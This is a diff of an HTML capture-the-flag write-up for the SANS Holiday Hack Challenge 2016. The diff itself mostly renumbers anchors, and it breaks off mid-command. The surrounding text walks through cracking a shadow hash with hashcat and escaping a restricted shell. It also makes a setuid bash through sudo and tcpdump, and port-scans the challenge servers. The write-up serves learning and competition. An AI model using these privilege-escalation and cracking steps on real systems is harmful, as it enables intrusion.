@@ -260,44 +260,44 @@ for the JavaScript code in this tag.
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents">
 <ul>
-<li><a href="#orgc3415b4">Introduction</a></li>
-<li><a href="#org8f75191">Answers</a></li>
-<li><a href="#org9dc76ae">Santa's Social Side #elfie</a>
+<li><a href="#org8dcc733">Introduction</a></li>
+<li><a href="#org13cd206">Answers</a></li>
+<li><a href="#org8d2181e">Santa's Social Side #elfie</a>
 <ul>
-<li><a href="#org5a9bb68">Twitter</a></li>
-<li><a href="#org55cc91d">Instagram</a></li>
+<li><a href="#org444b4ae">Twitter</a></li>
+<li><a href="#orgd27e9e1">Instagram</a></li>
 </ul>
 </li>
-<li><a href="#org62c58bf">Diving into the SantaGram app</a>
+<li><a href="#orgf33b1dc">Diving into the SantaGram app</a>
 <ul>
-<li><a href="#org1a59170">Username and password</a></li>
-<li><a href="#orgf14f81b">APK audio file</a></li>
+<li><a href="#org56c1dfc">Username and password</a></li>
+<li><a href="#org5696210">APK audio file</a></li>
 </ul>
 </li>
-<li><a href="#orgbaac8e7">Easy Like Cranberry Pie</a>
+<li><a href="#org74be988">Easy Like Cranberry Pie</a>
 <ul>
-<li><a href="#org49025ce">Cracking the password</a></li>
-<li><a href="#org94957d1">Behind Door #1</a></li>
+<li><a href="#orgdf7c94f">Cracking the password</a></li>
+<li><a href="#org9b63f64">Behind Door #1</a></li>
 </ul>
 </li>
-<li><a href="#org943bb14">Santa's Servers</a>
+<li><a href="#org8e636ea">Santa's Servers</a>
 <ul>
-<li><a href="#org72a6ce4">The Mobile Analytics Server (via credentialed login access)</a></li>
-<li><a href="#orgf338fb3">The Dungeon Game</a></li>
-<li><a href="#org32275a6">The Debug Server</a></li>
-<li><a href="#org4028466">The Banner Ad Server</a></li>
-<li><a href="#org07e7676">The Uncaught Exception Handler Server</a></li>
-<li><a href="#org4c9c295">The Mobile Analytics Server (post authentication)</a></li>
-<li><a href="#orgda1894e">Putting it All Together</a></li>
+<li><a href="#org3bf73f7">The Mobile Analytics Server (via credentialed login access)</a></li>
+<li><a href="#orgc4e68a5">The Dungeon Game</a></li>
+<li><a href="#orge197e21">The Debug Server</a></li>
+<li><a href="#org6a9d097">The Banner Ad Server</a></li>
+<li><a href="#orgc0e0ec7">The Uncaught Exception Handler Server</a></li>
+<li><a href="#orgb20f081">The Mobile Analytics Server (post authentication)</a></li>
+<li><a href="#org52dedee">Putting it All Together</a></li>
 </ul>
 </li>
-<li><a href="#orga60ca86">Bonus: Holiday Hack Quest</a>
+<li><a href="#org4959788">Bonus: Holiday Hack Quest</a>
 <ul>
-<li><a href="#org282def6">Coins</a></li>
-<li><a href="#org3f3eeb7">Easter Eggs</a></li>
+<li><a href="#org881c2ef">Coins</a></li>
+<li><a href="#org6347e31">Easter Eggs</a></li>
 </ul>
 </li>
-<li><a href="#org4b5b2a2">Final Thoughts</a></li>
+<li><a href="#orge962750">Final Thoughts</a></li>
 </ul>
 </div>
 </div>
@@ -307,9 +307,9 @@ for the JavaScript code in this tag.
 </p>
 </div>
 
-<div id="outline-container-orgc3415b4" class="outline-2">
-<h2 id="orgc3415b4">Introduction</h2>
-<div class="outline-text-2" id="text-orgc3415b4">
+<div id="outline-container-org8dcc733" class="outline-2">
+<h2 id="org8dcc733">Introduction</h2>
+<div class="outline-text-2" id="text-org8dcc733">
 <p>
 We are the Cybersecurity team at the <a href="http://www.ncsa.illinois.edu/">National Center for Supercomputing Applications</a>. This year, we decided to
 collaborate as a team on the <a href="https://holidayhackchallenge.com/2016/">SANS Holiday Hack Challenge</a>, and submit a single report. Comparing notes and
@@ -323,7 +323,7 @@ the SANS Holiday Hack tradition this year, which was great.
 We'll jump straight to the answers, and then go into some detail about how we
 got those answers. In some cases, once we've gotten the password or audio file,
 we proceed to dig even deeper, to do things like get command execution on a
-system, or reverse engineer a almost 40-year old game to generate a map. Feel
+system, or reverse engineer an almost 40-year old game to generate a map. Feel
 free to skip those sections, unless you like cool hacks, of course.
 </p>
 
@@ -341,9 +341,9 @@ We hope you enjoy it.
 </p>
 </div>
 </div>
-<div id="outline-container-org8f75191" class="outline-2">
-<h2 id="org8f75191">Answers</h2>
-<div class="outline-text-2" id="text-org8f75191">
+<div id="outline-container-org13cd206" class="outline-2">
+<h2 id="org13cd206">Answers</h2>
+<div class="outline-text-2" id="text-org13cd206">
 <ol class="org-ol">
 <li>What is the secret message in Santa's tweets?
 <b>BUG BOUNTY</b></li>
@@ -504,9 +504,9 @@ What are the names of the audio files you discovered from each system above?
 </ol>
 </div>
 </div>
-<div id="outline-container-org9dc76ae" class="outline-2">
-<h2 id="org9dc76ae">Santa's Social Side #elfie</h2>
-<div class="outline-text-2" id="text-org9dc76ae">
+<div id="outline-container-org8d2181e" class="outline-2">
+<h2 id="org8d2181e">Santa's Social Side #elfie</h2>
+<div class="outline-text-2" id="text-org8d2181e">
 <p>
 A close examination of Santa's card reveals a Twitter and Instagram username:
 </p>
@@ -527,9 +527,9 @@ Distribution Logistics North Pole • Twitter: @santawclaus - Instagram: @santaw
 </p>
 </blockquote>
 </div>
-<div id="outline-container-org5a9bb68" class="outline-3">
-<h3 id="org5a9bb68">Twitter</h3>
-<div class="outline-text-3" id="text-org5a9bb68">
+<div id="outline-container-org444b4ae" class="outline-3">
+<h3 id="org444b4ae">Twitter</h3>
+<div class="outline-text-3" id="text-org444b4ae">
 <p>
 At first, Santa's tweets seem rather nonsensical, filled with tweets like:
 </p>
@@ -582,9 +582,9 @@ convert -density <span style="color: #de935f;">400</span> part1.ps -trim +repage
 </div>
 </div>
 </div>
-<div id="outline-container-org55cc91d" class="outline-3">
-<h3 id="org55cc91d">Instagram</h3>
-<div class="outline-text-3" id="text-org55cc91d">
+<div id="outline-container-orgd27e9e1" class="outline-3">
+<h3 id="orgd27e9e1">Instagram</h3>
+<div class="outline-text-3" id="text-orgd27e9e1">
 <p>
 A close inspection of the images on Santa's Instagram feed reveal two important clues: a filename and a website.
 </p>
@@ -623,9 +623,9 @@ The ZIP file contains the SantaGram Android app (as an APK file).
 </div>
 </div>
 </div>
-<div id="outline-container-org62c58bf" class="outline-2">
-<h2 id="org62c58bf">Diving into the SantaGram app</h2>
-<div class="outline-text-2" id="text-org62c58bf">
+<div id="outline-container-orgf33b1dc" class="outline-2">
+<h2 id="orgf33b1dc">Diving into the SantaGram app</h2>
+<div class="outline-text-2" id="text-orgf33b1dc">
 <p>
 For analyzing the APK, Shinny Upatree gives us the following hints:
 </p>
@@ -647,14 +647,14 @@ unzip SantaGram_4.2.apk -d SantaGram_4.2_apk_contents
 </pre>
 </div>
 </div>
-<div id="outline-container-org1a59170" class="outline-3">
-<h3 id="org1a59170">Username and password</h3>
-<div class="outline-text-3" id="text-org1a59170">
+<div id="outline-container-org56c1dfc" class="outline-3">
+<h3 id="org56c1dfc">Username and password</h3>
+<div class="outline-text-3" id="text-org56c1dfc">
 <p>
 Question 3 tells us that there's at least one set of credentials in the APK file:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org3139937">egrep --recursive --word-regexp --color <span style="color: #b5bd68;">'(username|password)'</span> SantaGram_4.2
+<pre class="src src-sh" id="orga57084b">egrep --recursive --word-regexp --color <span style="color: #b5bd68;">'(username|password)'</span> SantaGram_4.2
 </pre>
 </div>
 
@@ -688,14 +688,14 @@ SantaGram_4.2/res/layout/sign_up.xml:            &lt;EditText android:id="@id/pa
 </div>
 </div>
 
-<div id="outline-container-orgf14f81b" class="outline-3">
-<h3 id="orgf14f81b">APK audio file</h3>
-<div class="outline-text-3" id="text-orgf14f81b">
+<div id="outline-container-org5696210" class="outline-3">
+<h3 id="org5696210">APK audio file</h3>
+<div class="outline-text-3" id="text-org5696210">
 <p>
 As we're looking for a resource, we'll search the unzipped contents of the APK (not the jadx decompilation) for files with an audio extension:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orgc9afabf">find SantaGram_4.2_apk_contents -iname <span style="color: #b5bd68;">'*.mp3'</span> -or -iname <span style="color: #b5bd68;">'*.mp4'</span> -or -iname <span style="color: #b5bd68;">'*.aac'</span> -or -iname <span style="color: #b5bd68;">'*.flac'</span> -or -iname <span style="color: #b5bd68;">'*.ogg'</span>
+<pre class="src src-sh" id="orgfa70609">find SantaGram_4.2_apk_contents -iname <span style="color: #b5bd68;">'*.mp3'</span> -or -iname <span style="color: #b5bd68;">'*.mp4'</span> -or -iname <span style="color: #b5bd68;">'*.aac'</span> -or -iname <span style="color: #b5bd68;">'*.flac'</span> -or -iname <span style="color: #b5bd68;">'*.ogg'</span>
 </pre>
 </div>
 
@@ -709,15 +709,15 @@ And just like that, we have our first piece of the puzzle.
 </div>
 </div>
 </div>
-<div id="outline-container-orgbaac8e7" class="outline-2">
-<h2 id="orgbaac8e7">Easy Like Cranberry Pie</h2>
-<div class="outline-text-2" id="text-orgbaac8e7">
+<div id="outline-container-org74be988" class="outline-2">
+<h2 id="org74be988">Easy Like Cranberry Pie</h2>
+<div class="outline-text-2" id="text-org74be988">
 <p>
 Once all the pieces of the Cranberry Pi have been found, Holly Evergreen will give you one more piece to look at: the Cranbian image.
 Let's get it mounted. First, we'll use fdisk to list the partitions:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org35108b7">fdisk -l /mnt/storage/sans/2016/part_1/cranbian-jessie.img
+<pre class="src src-sh" id="org3a9aa3e">fdisk -l /mnt/storage/sans/2016/part_1/cranbian-jessie.img
 </pre>
 </div>
 
@@ -739,7 +739,7 @@ We want to extract the Linux partition:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orgbecb466">mkdir cranbian-jessie_mount
+<pre class="src src-sh" id="org23f1319">mkdir cranbian-jessie_mount
 dd <span style="color: #8abeb7;">if</span>=cranbian-jessie.img <span style="color: #8abeb7;">of</span>=cranbian-jessie.img2 <span style="color: #8abeb7;">skip</span>=<span style="color: #de935f;">137216</span> <span style="color: #8abeb7;">count</span>=<span style="color: #de935f;">2576384</span>
 </pre>
 </div>
@@ -751,7 +751,7 @@ dd <span style="color: #8abeb7;">if</span>=cranbian-jessie.img <span style="colo
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org39d3df8">file cranbian-jessie.img2
+<pre class="src src-sh" id="org827423e">file cranbian-jessie.img2
 </pre>
 </div>
 
@@ -764,7 +764,7 @@ Finally, we can mount it:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orga86b1f2">sudo mount -t ext4 -o loop,ro,noexec,noload cranbian-jessie.img2 cranbian-jessie_mount/
+<pre class="src src-sh" id="orgc3afe75">sudo mount -t ext4 -o loop,ro,noexec,noload cranbian-jessie.img2 cranbian-jessie_mount/
 </pre>
 </div>
 
@@ -776,14 +776,14 @@ Finally, we can mount it:
 </div>
 </div>
 
-<div id="outline-container-org49025ce" class="outline-3">
-<h3 id="org49025ce">Cracking the password</h3>
-<div class="outline-text-3" id="text-org49025ce">
+<div id="outline-container-orgdf7c94f" class="outline-3">
+<h3 id="orgdf7c94f">Cracking the password</h3>
+<div class="outline-text-3" id="text-orgdf7c94f">
 <p>
 Poking around in the Cranbian image a bit, we can find a 'cranpi' account in /etc/passwd and /etc/shadow.
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orga4a6f01">sudo grep cranpi etc/<span style="color: #b294bb;">{</span>group,passwd,shadow<span style="color: #b294bb;">}</span>
+<pre class="src src-sh" id="org2d26044">sudo grep cranpi etc/<span style="color: #b294bb;">{</span>group,passwd,shadow<span style="color: #b294bb;">}</span>
 </pre>
 </div>
 
@@ -815,7 +815,7 @@ The shadow file contains a password hash for the cranpi account. We can use the 
 Minty Candycane suggests using John the Ripper to crack password hashes. However, we've got better things to do with our time. Let's use ocl-hashcat, which will use GPU cracking:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org56850dd">sudo /opt/oclhashcat-plus-bin/cudaHashcat64.bin -m <span style="color: #de935f;">1800</span> -a <span style="color: #de935f;">0</span> --remove cranpi_shadow /opt/oclhashcat-plus-bin/rockyou.txt
+<pre class="src src-sh" id="org6bc8a12">sudo /opt/oclhashcat-plus-bin/cudaHashcat64.bin -m <span style="color: #de935f;">1800</span> -a <span style="color: #de935f;">0</span> --remove cranpi_shadow /opt/oclhashcat-plus-bin/rockyou.txt
 </pre>
 </div>
 
@@ -863,12 +863,12 @@ Once we tell Holly Evergreen that the password is <code>yummycookies</code>, we 
 </p>
 </div>
 </div>
-<div id="outline-container-org94957d1" class="outline-3">
-<h3 id="org94957d1">Behind Door #1</h3>
-<div class="outline-text-3" id="text-org94957d1">
-</div><div id="outline-container-org22631a1" class="outline-4">
-<h4 id="org22631a1">Directory</h4>
-<div class="outline-text-4" id="text-org22631a1">
+<div id="outline-container-org9b63f64" class="outline-3">
+<h3 id="org9b63f64">Behind Door #1</h3>
+<div class="outline-text-3" id="text-org9b63f64">
+</div><div id="outline-container-org876f6d8" class="outline-4">
+<h4 id="org876f6d8">Directory</h4>
+<div class="outline-text-4" id="text-org876f6d8">
 <p>
 Pulling up the terminal tells us:
 </p>
@@ -879,7 +879,7 @@ To open the door, find the passphrase file deep in the directories.<br  />
 Let's run a quick find to see what we're working with. We'll list only files (and not directories).
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org2af8f9e">find . -type f
+<pre class="src src-sh" id="org4696cd2">find . -type f
 </pre>
 </div>
 
@@ -894,7 +894,7 @@ Let's run a quick find to see what we're working with. We'll list only files (an
 Looks promising, so let's go ahead and look at that file:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org28f80d9">find . -name key_for_the_door.txt -exec cat <span style="color: #b294bb;">{}</span> <span style="color: #b5bd68;">\;</span>
+<pre class="src src-sh" id="org5981f85">find . -name key_for_the_door.txt -exec cat <span style="color: #b294bb;">{}</span> <span style="color: #b5bd68;">\;</span>
 </pre>
 </div>
 
@@ -903,12 +903,12 @@ key: open_sesame
 </pre>
 </div>
 
-<ul class="org-ul"><li><a id="orgdfcfa9c"></a>Digging Deeper<br  /><div class="outline-text-5" id="text-orgdfcfa9c">
+<ul class="org-ul"><li><a id="orgf120654"></a>Digging Deeper<br  /><div class="outline-text-5" id="text-orgf120654">
 <p>
 Let's take a closer look at this one. Interacting with this system, we see that the shell isn't behaving quite right. Most importantly, tab completion doesn't work.
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org2d6e7f1">ps x
+<pre class="src src-sh" id="orgf9cc565">ps x
 </pre>
 </div>
 
@@ -936,9 +936,9 @@ within the noediting bash, and then savor that sweet, sweet tab completion.
 </p>
 </div></li></ul>
 </div>
-<div id="outline-container-org41f6162" class="outline-4">
-<h4 id="org41f6162">War Games</h4>
-<div class="outline-text-4" id="text-org41f6162">
+<div id="outline-container-org80d85b5" class="outline-4">
+<h4 id="org80d85b5">War Games</h4>
+<div class="outline-text-4" id="text-org80d85b5">
 <p>
 Connecting to this terminal just gives us a prompt of:
 </p>
@@ -1021,9 +1021,9 @@ LOOK AT THE PRETTY LIGHTS
 </pre>
 </div>
 </div>
-<div id="outline-container-org652b3a9" class="outline-4">
-<h4 id="org652b3a9">Wumpus</h4>
-<div class="outline-text-4" id="text-org652b3a9">
+<div id="outline-container-orgda27c03" class="outline-4">
+<h4 id="orgda27c03">Wumpus</h4>
+<div class="outline-text-4" id="text-orgda27c03">
 <p>
 On this terminal, the banner is:
 </p>
@@ -1034,7 +1034,7 @@ Find the passphrase from the wumpus.  Play fair or cheat; it's up to you.<br  />
 Clearly we should cheat.
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org22c591e">find . -ls
+<pre class="src src-sh" id="orga1e4b87">find . -ls
 </pre>
 </div>
 
@@ -1047,7 +1047,7 @@ Clearly we should cheat.
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orgac5a861">./wumpus
+<pre class="src src-sh" id="org9527759">./wumpus
 </pre>
 </div>
 
@@ -1078,7 +1078,7 @@ There are tunnels to rooms 10, 14, and 16.
 Move or shoot? (m-s) q
 </pre>
 </div>
-<ul class="org-ul"><li><a id="orgf233d30"></a>Brute-force<br  /><div class="outline-text-5" id="text-orgf233d30">
+<ul class="org-ul"><li><a id="org3cff52d"></a>Brute-force<br  /><div class="outline-text-5" id="text-org3cff52d">
 <p>
 Looking at the strings in the data section of the wumpus executable doesn't show
 an obvious passphrase.
@@ -1090,7 +1090,7 @@ try shooting our 5 arrows into rooms 1-5, and hope that we get lucky and hit the
 Wumpus.
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org2552229"><span style="color: #8abeb7;">printf</span> <span style="color: #b5bd68;">"n\ns1\ns2\ns3\ns4\ns5\n"</span> | ./wumpus
+<pre class="src src-sh" id="orge3df9e6"><span style="color: #8abeb7;">printf</span> <span style="color: #b5bd68;">"n\ns1\ns2\ns3\ns4\ns5\n"</span> | ./wumpus
 </pre>
 </div>
 
@@ -1119,7 +1119,7 @@ that didn't show up in the data section. We'll also remove the 'You are in room
 X' messages.
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orga99e71c">strings --data wumpus &gt; wumpus.strings 
+<pre class="src src-sh" id="org7c742db">strings --data wumpus &gt; wumpus.strings 
 <span style="color: #b294bb;">for</span> i<span style="color: #b294bb;"> in</span> $<span style="color: #b294bb;">(</span><span style="color: #81a2be;">seq</span> <span style="color: #de935f;">50</span><span style="color: #b294bb;">)</span>
     <span style="color: #b294bb;">do </span><span style="color: #8abeb7;">printf</span> <span style="color: #b5bd68;">"n\ns1\ns2\ns3\ns4\ns5\n"</span> | ./wumpus | grep --invert-match --file=wumpus.strings | grep --invert-match room
 <span style="color: #b294bb;">done</span> | sort | uniq
@@ -1143,7 +1143,7 @@ you, and with a mighty *ROAR* eats you alive!
 <code>WUMPUS IS MISUNDERSTOOD</code> stands out, and it turns out that that is the passphrase.
 </p>
 </div></li>
-<li><a id="orgac02e85"></a>Static Analysis<br  /><div class="outline-text-5" id="text-orgac02e85">
+<li><a id="org218b7b7"></a>Static Analysis<br  /><div class="outline-text-5" id="text-org218b7b7">
 <p>
 We were able to brute-force the password, but we don't really feel good about
 that solution. It's based on luck, and it feels like there's a better solution
@@ -1156,7 +1156,7 @@ container we're connected to doesn't have Internet access, we need to use
 copy-paste and get a little creative:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orgd62b006">gzip -c wumpus | base64 --wrap=<span style="color: #de935f;">0</span>; <span style="color: #8abeb7;">echo</span>
+<pre class="src src-sh" id="org7b131f5">gzip -c wumpus | base64 --wrap=<span style="color: #de935f;">0</span>; <span style="color: #8abeb7;">echo</span>
 </pre>
 </div>
 
@@ -1220,7 +1220,7 @@ quiver holds 1 custom super anti-evil Wumpus arrows.  Good luck.
 We can use these parameters to improve our odds.
 </p>
 </div></li>
-<li><a id="orgb68e2a3"></a>LD_PRELOAD randomness removal<br  /><div class="outline-text-5" id="text-orgb68e2a3">
+<li><a id="org42386a9"></a>LD_PRELOAD randomness removal<br  /><div class="outline-text-5" id="text-org42386a9">
 <p>
 We have one last trick that we can use to cheat. While playing with sending commands to the game via a pipe it was noticed that the game layout appeared to only change once each second.  This is an indication that the code is doing something like <code>srand(time(NULL))</code> to initialize the random seed.
 </p>
@@ -1291,9 +1291,9 @@ No more games for us, thanks. No need to beat a dead wumpus.
 </p>
 </div></li></ul>
 </div>
-<div id="outline-container-org3eb05a3" class="outline-4">
-<h4 id="org3eb05a3">Itchy and Scratchy</h4>
-<div class="outline-text-4" id="text-org3eb05a3">
+<div id="outline-container-org7f2abfe" class="outline-4">
+<h4 id="org7f2abfe">Itchy and Scratchy</h4>
+<div class="outline-text-4" id="text-org7f2abfe">
 <p class="verse">
 To open the door, find both parts of the passphrase inside the /out.pcap file<br  />
 </p>
@@ -1303,7 +1303,7 @@ We need to find the password hidden in the PCAP. Sounds easy enough&#x2026;
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org95aa2f6">ls -l /out.pcap
+<pre class="src src-sh" id="org664144c">ls -l /out.pcap
 </pre>
 </div>
 
@@ -1312,7 +1312,7 @@ We need to find the password hidden in the PCAP. Sounds easy enough&#x2026;
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org45b20cb">scratchy@c35b2f66b468:/$ id
+<pre class="src src-sh" id="org41830a4">scratchy@c35b2f66b468:/$ id
 </pre>
 </div>
 
@@ -1324,7 +1324,7 @@ uid=1001(scratchy) gid=1001(scratchy) groups=1001(scratchy)
 Well, we can't access the file, since it's owned by a different user, and not readable by anyone else. Can we do anything fun with <code>sudo</code>?
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org094dbfa">sudo -l
+<pre class="src src-sh" id="org2ce16ec">sudo -l
 </pre>
 </div>
 
@@ -1341,7 +1341,7 @@ We're able to run two commands as itchy, so let's see what we can do with that. 
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org84deffc">sudo --user=itchy /usr/bin/strings /out.pcap | awk <span style="color: #b5bd68;">'{ print length() " " $0; }'</span> | sort --numeric-sort | tail
+<pre class="src src-sh" id="orga67f997">sudo --user=itchy /usr/bin/strings /out.pcap | awk <span style="color: #b5bd68;">'{ print length() " " $0; }'</span> | sort --numeric-sort | tail
 </pre>
 </div>
 
@@ -1365,7 +1365,7 @@ We're able to run two commands as itchy, so let's see what we can do with that. 
 Part 1 is <code>santasli</code>. We could've gotten this with <code>tcpdump</code>, so it's a bit suspicious that <code>strings</code> is also included in our <code>sudo</code> permissions. Let's use <code>strings</code> to search for unicode (16-bit littleendian) data:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org534e916">sudo -u itchy /usr/bin/strings --encoding=l /out.pcap
+<pre class="src src-sh" id="orgabcb273">sudo -u itchy /usr/bin/strings --encoding=l /out.pcap
 </pre>
 </div>
 
@@ -1377,7 +1377,7 @@ part2:ttlehelper
 Bingo. <code>santaslittlehelper</code>.
 </p>
 </div>
-<ul class="org-ul"><li><a id="orgfd799f3"></a>Digging Deeper<br  /><div class="outline-text-5" id="text-orgfd799f3">
+<ul class="org-ul"><li><a id="orge5ccef9"></a>Digging Deeper<br  /><div class="outline-text-5" id="text-orge5ccef9">
 <p>
 Let's retrieve the PCAP, in case there's some easter eggs hidden in there.
 </p>
@@ -1429,7 +1429,7 @@ logging.basicConfig<span style="color: #b294bb;">()</span>
 </div>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org506ff77">./tty_oneshot.py <span style="color: #de935f;">60002</span> <span style="color: #b5bd68;">'sudo -u itchy tcpdump -n -r /out.pcap -w - 2&gt;/dev/null | base64'</span> | base64 -d &gt; out.pcap
+<pre class="src src-sh" id="org67c3505">./tty_oneshot.py <span style="color: #de935f;">60002</span> <span style="color: #b5bd68;">'sudo -u itchy tcpdump -n -r /out.pcap -w - 2&gt;/dev/null | base64'</span> | base64 -d &gt; out.pcap
 </pre>
 </div>
 
@@ -1441,7 +1441,7 @@ For all that, though, we couldn't find anything in the PCAP.
 To be thorough, let's escalate our privileges to itchy, and see if there's anything hidden on the system. First, we'll create a script that copies /bin/bash, but makes it setuid. Then we'll run tcpdump as itchy, and have tcpdump execute our script when it's done.
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orgc61006e"><span style="color: #8abeb7;">cd</span>
+<pre class="src src-sh" id="orgff88b25"><span style="color: #8abeb7;">cd</span>
 cat &lt;&lt; EOF &gt; exec.sh
 <span style="color: #b5bd68;">#!/bin/bash</span>
 
@@ -1472,7 +1472,7 @@ user id is not reset.
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orgc447e5e">/tmp/bash -p -c id
+<pre class="src src-sh" id="orgc8eb9ec">/tmp/bash -p -c id
 </pre>
 </div>
 
@@ -1485,9 +1485,9 @@ Unfortunately, we didn't find anything else hidden on this system.
 </p>
 </div></li></ul>
 </div>
-<div id="outline-container-orgdd936c4" class="outline-4">
-<h4 id="orgdd936c4">Train Console</h4>
-<div class="outline-text-4" id="text-orgdd936c4">
+<div id="outline-container-org265070f" class="outline-4">
+<h4 id="org265070f">Train Console</h4>
+<div class="outline-text-4" id="text-org265070f">
 <p>
 We're dropped into a train management console shell script. Once we release the
 brake, we need a password to start the train. If we view the help document,
@@ -1502,20 +1502,20 @@ interesting ones stand out:
 We can type <code>!/bin/bash</code> to get into a shell. In the home directory, we have a few files for the Train Management Console:
 </p>
 </div>
-<ul class="org-ul"><li><a id="org1bc6207"></a><code>Train_Console</code> is the script which was originally running, and which has the password (24fb3e89ce2aa0ea422c3d511d40dd84) hardcoded.<br  /></li>
-<li><a id="org1ee3eca"></a><code>TrainHelper.txt</code> is the help file that we were viewing in less.<br  /></li>
-<li><a id="org1d84c3e"></a><code>ActivateTrain</code> is a binary which uses our <code>QUEST_UID</code> to POST a request to 10.240.0.19 and teleports us in the game. Next time we use this console, we can just run <code>!./ActivateTrain</code> from less, and we'll be on our way.<br  /></li></ul>
+<ul class="org-ul"><li><a id="org4a5be6c"></a><code>Train_Console</code> is the script which was originally running, and which has the password (24fb3e89ce2aa0ea422c3d511d40dd84) hardcoded.<br  /></li>
+<li><a id="org639bc6b"></a><code>TrainHelper.txt</code> is the help file that we were viewing in less.<br  /></li>
+<li><a id="orgcc8598e"></a><code>ActivateTrain</code> is a binary which uses our <code>QUEST_UID</code> to POST a request to 10.240.0.19 and teleports us in the game. Next time we use this console, we can just run <code>!./ActivateTrain</code> from less, and we'll be on our way.<br  /></li></ul>
 </div>
 </div>
 </div>
-<div id="outline-container-org943bb14" class="outline-2">
-<h2 id="org943bb14">Santa's Servers</h2>
-<div class="outline-text-2" id="text-org943bb14">
+<div id="outline-container-org8e636ea" class="outline-2">
+<h2 id="org8e636ea">Santa's Servers</h2>
+<div class="outline-text-2" id="text-org8e636ea">
 <p>
 The APK has references to six URLs:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org3cbfc96">grep -r url SantaGram_4.2 | grep northpolewonderland.com
+<pre class="src src-sh" id="org174c443">grep -r url SantaGram_4.2 | grep northpolewonderland.com
 </pre>
 </div>
 
@@ -1541,7 +1541,7 @@ for extra services.<br  />
 nmap is cool, but I like masscan even better for things like this:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org5a49e97">masscan -p0-65535,U:0-65535 --includefile targets --rate <span style="color: #de935f;">5000</span>
+<pre class="src src-sh" id="org9d03aa7">masscan -p0-65535,U:0-65535 --includefile targets --rate <span style="color: #de935f;">5000</span>
 </pre>
 </div>
 
@@ -1565,9 +1565,9 @@ Discovered open port 80/tcp on 104.154.196.33
 </pre>
 </div>
 
-<div id="outline-container-org72a6ce4" class="outline-3">
-<h3 id="org72a6ce4">The Mobile Analytics Server (via credentialed login access)</h3>
-<div class="outline-text-3" id="text-org72a6ce4">
+<div id="outline-container-org3bf73f7" class="outline-3">
+<h3 id="org3bf73f7">The Mobile Analytics Server (via credentialed login access)</h3>
+<div class="outline-text-3" id="text-org3bf73f7">
 <p>
 Looking at the decompiled SantaGram code, the <code>analytics_launch_url</code> and <code>analytics_usage_url</code> are each used in a single place. The JSON that is sent to each of those URLs lists a username and password:
 </p>
@@ -1601,14 +1601,14 @@ We notice an MP3 nav item at the top, which gives us discombobulatedaudio2.mp3
 </div>
 </div>
 
-<div id="outline-container-orgf338fb3" class="outline-3">
-<h3 id="orgf338fb3">The Dungeon Game</h3>
-<div class="outline-text-3" id="text-orgf338fb3">
+<div id="outline-container-orgc4e68a5" class="outline-3">
+<h3 id="orgc4e68a5">The Dungeon Game</h3>
+<div class="outline-text-3" id="text-orgc4e68a5">
 <p>
 From the port scan, we see well-known ports for SSH, HTTP, HTTPS, and the uncommon port tcp/11111. If we connect to that, we get dropped in a game of Dungeon:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org5be5159">nc dungeon.northpolewonderland.com <span style="color: #de935f;">11111</span>
+<pre class="src src-sh" id="org3d06c4c">nc dungeon.northpolewonderland.com <span style="color: #de935f;">11111</span>
 </pre>
 </div>
 
@@ -1866,7 +1866,7 @@ Searching around tells us that that is the menu from the Game Debugging Tool, wh
 Our diff flagged a couple of messages as being important, such as 1024: "The elf, satisified with the trade says - Try the online version for the true prize". One of the debugging commands is <code>DT</code>, which will display text messages:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orgfc557c1"><span style="color: #8abeb7;">printf</span> <span style="color: #b5bd68;">"gdt\ndt\n1024\nexit\nquit\ny\n"</span> | nc dungeon.northpolewonderland.com <span style="color: #de935f;">11111</span> | grep --context=<span style="color: #de935f;">1</span> elf
+<pre class="src src-sh" id="org336898f"><span style="color: #8abeb7;">printf</span> <span style="color: #b5bd68;">"gdt\ndt\n1024\nexit\nquit\ny\n"</span> | nc dungeon.northpolewonderland.com <span style="color: #de935f;">11111</span> | grep --context=<span style="color: #de935f;">1</span> elf
 </pre>
 </div>
 
@@ -1881,9 +1881,9 @@ Excellent! We can now e-mail peppermint@northpolewonderland.com and we receive d
 </p>
 </div>
 </div>
-<div id="outline-container-org32275a6" class="outline-3">
-<h3 id="org32275a6">The Debug Server</h3>
-<div class="outline-text-3" id="text-org32275a6">
+<div id="outline-container-orge197e21" class="outline-3">
+<h3 id="orge197e21">The Debug Server</h3>
+<div class="outline-text-3" id="text-orge197e21">
 <p>
 Similar to the analytics URLs, the debug data collection URL is only used in one place:
 </p>
@@ -1906,7 +1906,7 @@ jSONObject.put<span style="color: #b294bb;">(</span><span style="color: #b5bd68;
 We can fake a request, and see what happens:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orgfc40378">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> <span style="color: #b5bd68;">\</span>
